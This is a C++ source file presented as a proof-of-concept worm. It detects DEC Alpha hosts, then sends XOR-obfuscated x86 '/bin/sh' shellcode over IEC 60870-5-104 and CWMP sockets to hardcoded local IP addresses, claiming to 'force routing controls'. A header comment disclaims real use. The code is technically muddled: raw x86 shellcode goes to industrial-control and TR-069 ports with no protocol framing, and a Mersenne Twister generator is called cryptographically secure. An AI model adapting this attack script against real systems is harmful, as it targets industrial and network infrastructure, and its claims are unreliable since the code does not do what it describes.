// Message from Creator
// This is NOT to be used as a real exploit on real systems
// DEC Alpha is not in major use and this exploit is only to show what COULD'VE happened
// Do NOT, I repeat, Do NOT use this as an actual code for malware
// Not only because it's malicious, but you're going to get nothing in terms of propagation

// Keep this a PoC, don't harm real people

#include <iostream>
#include <unistd.h>
#include <sys/utsname.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <thread>
#include <vector>
#include <algorithm> // for std::transform
#include <cstdlib> // for std::rand and std::srand
#include <ctime> // for std::time
#include <random> // for std::random_device and std::mt19937
#include <stdexcept> // for std::runtime_error

// Define necessary constants and structures for IEC 60870-5-104
#define IEC_60870_PORT 2404
#define CWMP_PORT 8089

// Function to detect DEC Alpha system
bool isDecAlpha() {
    struct utsname buffer;
    if (uname(&buffer) != 0) {
        return false;
    }
    return strstr(buffer.machine, "alpha") != nullptr;
}

// Function to generate a cryptographically secure random key
unsigned char* generateSecureRandomKey(size_t keySize) {
    std::random_device rd; // Obtain a random number from hardware
    std::mt19937 gen(rd()); // Seed with a real random value, if available
    std::uniform_int_distribution<> dis(0, 255);
    unsigned char* key = new unsigned char[keySize];
    for (size_t i = 0; i < keySize; ++i) {
        key[i] = static_cast<unsigned char>(dis(gen));
    }
    return key;
}

// Function to XOR encrypt/decrypt a byte array with a dynamic key
void dynamicXorEncryptDecrypt(unsigned char* data, size_t length, const unsigned char* key, size_t keySize) {
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key[i % keySize];
    }
}

// Real malicious payloads for IEC 60870-5-104 and CWMP
// Example shellcode for demonstration purposes
unsigned char iecPayload[] = {
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0x99, 0xb0, 0x0b, 0xcd, 0x80
};
unsigned char cwmpPayload[] = {
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50, 0x53, 0x89, 0xe1, 0x99, 0xb0, 0x0b, 0xcd, 0x80
};

// Function to send IEC 60870-5-104 messages
void sendIec60870Message(const std::string& targetIp) {
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cerr << "Socket creation error" << std::endl;
        return;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(IEC_60870_PORT);

    if (inet_pton(AF_INET, targetIp.c_str(), &serv_addr.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported" << std::endl;
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        std::cerr << "Connection Failed" << std::endl;
        close(sock);
        return;
    }

    // Generate a secure random key for obfuscation
    size_t keySize = 16; // 128-bit key
    unsigned char* key = generateSecureRandomKey(keySize);

    // Create a copy of the payload to encrypt
    std::vector<unsigned char> encryptedIecPayload(iecPayload, iecPayload + sizeof(iecPayload));
    dynamicXorEncryptDecrypt(encryptedIecPayload.data(), encryptedIecPayload.size(), key, keySize);

    // Send the key first
    ssize_t bytesSent = send(sock, key, keySize, 0);
    if (bytesSent < 0) {
        std::cerr << "Send key failed" << std::endl;
        close(sock);
        delete[] key;
        return;
    }

    // Send IEC 60870-5-104 malicious message
    bytesSent = send(sock, encryptedIecPayload.data(), encryptedIecPayload.size(), 0);
    if (bytesSent < 0) {
        std::cerr << "Send payload failed" << std::endl;
    } else {
        std::cout << "Encrypted malicious message sent to " << targetIp << std::endl;
    }

    close(sock);
    delete[] key;
}

// Function to force routing controls via CWMP
void forceRoutingControls(const std::string& targetIp) {
    int sock = 0;
    struct sockaddr_in serv_addr;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        std::cerr << "Socket creation error" << std::endl;
        return;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(CWMP_PORT);

    if (inet_pton(AF_INET, targetIp.c_str(), &serv_addr.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported" << std::endl;
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        std::cerr << "Connection Failed" << std::endl;
        close(sock);
        return;
    }

    // Generate a secure random key for obfuscation
    size_t keySize = 16; // 128-bit key
    unsigned char* key = generateSecureRandomKey(keySize);

    // Create a copy of the payload to encrypt
    std::vector<unsigned char> encryptedCwmpPayload(cwmpPayload, cwmpPayload + sizeof(cwmpPayload));
    dynamicXorEncryptDecrypt(encryptedCwmpPayload.data(), encryptedCwmpPayload.size(), key, keySize);

    // Send the key first
    ssize_t bytesSent = send(sock, key, keySize, 0);
    if (bytesSent < 0) {
        std::cerr << "Send key failed" << std::endl;
        close(sock);
        delete[] key;
        return;
    }

    // Send CWMP malicious message to force routing controls
    bytesSent = send(sock, encryptedCwmpPayload.data(), encryptedCwmpPayload.size(), 0);
    if (bytesSent < 0) {
        std::cerr << "Send payload failed" << std::endl;
    } else {
        std::cout << "Encrypted malicious routing control message sent to " << targetIp << std::endl;
    }

    close(sock);
    delete[] key;
}

int main() {
    if (isDecAlpha()) {
        std::cout << "Running on DEC Alpha system" << std::endl;

        // List of target IPs to spread the message
        std::vector<std::string> targetIps = {"192.168.1.1", "192.168.1.2", "192.168.1.3"};

        std::vector<std::thread> threads;
        for (const auto& ip : targetIps) {
            threads.emplace_back(sendIec60870Message, ip);
        }

        for (auto& thread : threads) {
            thread.join();
        }

        // Force routing controls
        threads.clear();
        for (const auto& ip : targetIps) {
            threads.emplace_back(forceRoutingControls, ip);
        }

        for (auto& thread : threads) {
            thread.join();
        }
    } else {
        std::cout << "Not running on DEC Alpha system" << std::endl;
    }

    return 0;
}
